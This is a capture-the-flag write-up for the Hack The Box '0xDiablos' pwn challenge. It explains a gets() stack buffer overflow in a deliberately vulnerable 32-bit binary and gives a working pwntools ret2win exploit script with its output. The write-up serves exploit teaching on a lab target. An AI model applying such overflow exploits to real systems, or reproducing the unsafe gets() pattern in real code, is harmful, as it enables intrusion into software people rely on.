# You Know 0xDiablos

### Initial Analysis

This challenge provides us with a single executable: `vuln`

Upon running the binary, we are greeted with a message, it then prompts us for an input, echos it back and exits:

```bash
└─$ ./vuln
You know who are 0xDiablos: 
no
no
```

Checksec shows us the following:

```scheme
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Hmm, RWX segments, interesting....

### Code analysis

Decompilation for `main`:

```c
undefined4 main(void)
{
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

An interestingly named function `vuln`:

```c
void vuln(void)
{
  char buffer [180];
  
  gets(buffer);
  puts(buffer);
  return;
}
```

And finally a function called `flag`:

```c
void flag(int param_1,int param_2)
{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Since we have an unbound buffer overflow in `vuln:5`, and a `flag` function, this looks like a typical ret2win type of challenge, with a little twist. There is a check on `flag:9` for the values of 2 parameters that are passed to the `flag` function. Since this is a 32-bit binary, function parameters are passed onto the stack, so all we will have to do, is include the values on the stack in the correct position, in our overflow.  
  
Those values in unsigned form happen to be: `0xdeadbeef` and `0xc0ded00d`.

After a call to a function, this is what the stack layout looks like in 32-bit:

![](../../../.gitbook/assets/3jl88-1-.png)

So at the time of the `flag` call, we will need to have the parameters starting 4 bytes from `ESP`.

### Exploitation

The following exploit script should do the trick:

{% code title="x.py" %}
```python
from pwn import *

bin = ELF("./vuln")
rop = ROP(bin.path)
gdbs = """
c
"""

def run():
        global libc
        if args.R:
                p = remote()
                libc = ELF("./libc.so.6")
        elif args.D:
                p = gdb.debug(bin.path, gdbs)
                libc = p.libc
        else:
                p = process(bin.path)
                libc = p.libc

        return p

p = run()

payload = b""
payload += (184 - len(payload))*b"A" #overflow
payload += p32(0) #ebp
payload += p32(bin.sym.flag) #eip
payload += p32(0) #esp will pe pointing here after the return to `flag`
payload += p32(0xdeadbeef) #parameter 1
payload += p32(0xc0ded00d) #parameter 2

p.recv()    
p.sendline(payload) #send the payload to the program
p.interactive() #should now print out the flag
```
{% endcode %}

And sure enough it does:

```aspnet
└─$ python3 x.py  
[*] '/home/p00dl3/Documents/HTB/Challanges/Pwn/you-know-0xdiablos/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] Loaded 10 cached gadgets for '/home/p00dl3/Documents/HTB/Challanges/Pwn/you-know-0xdiablos/vuln'
[+] Starting local process '/home/p00dl3/Documents/HTB/Challanges/Pwn/you-know-0xdiablos/vuln': pid 10943
[*] '/usr/lib/i386-linux-gnu/libc-2.31.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
HTB{test-flag}
[*] Got EOF while reading in interactive
$
```

